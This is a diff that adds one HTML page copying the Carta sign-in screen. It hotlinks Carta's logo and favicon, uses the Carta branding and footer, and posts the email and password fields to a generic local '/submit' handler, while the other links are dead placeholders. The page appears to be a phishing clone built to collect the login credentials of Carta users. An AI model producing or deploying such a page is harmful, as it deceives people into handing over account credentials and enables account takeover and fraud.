@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Log into your account | Carta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <link rel="icon" href="https://carta.com/wp-content/uploads/2022/06/carta-favicon.png" />
+  <style>
+    body {
+      background-color: #f9fafb;
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #1d1d1f;
+    }
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      padding: 40px;
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      width: 150px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: 500;
+      font-size: 22px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #333;
+      font-size: 14px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #d0d3d9;
+      border-radius: 6px;
+      box-sizing: border-box;
+      font-size: 15px;
+    }
+    .button {
+      background-color: #0052cc;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+    }
+    .button:hover {
+      background-color: #003f99;
+    }
+    .link {
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+    .link a {
+      color: #0052cc;
+      text-decoration: none;
+    }
+    .link a:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      margin-top: 30px;
+    }
+    .footer a {
+      color: #999;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <img src="https://carta.com/wp-content/uploads/2022/06/carta-logo.svg" alt="Carta">
+    </div>
+    <h2>Log into your Carta account</h2>
+
+    <form action="/submit" method="POST">
+      <label for="email">Email address</label>
+      <input type="email" id="email" name="email" placeholder="you@example.com" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <button type="submit" class="button">Sign In</button>
+    </form>
+
+    <div class="link">
+      <a href="#">Forgot password?</a>
+    </div>
+    <div class="link" style="text-align: center;">
+      <a href="#">Sign up</a> | <a href="#">Help</a>
+    </div>
+
+    <div class="footer">
+      © 2025 Carta, Inc. | <a href="#">Privacy</a> | <a href="#">Terms</a>
+    </div>
+  </div>
+
+</body>
+</html>
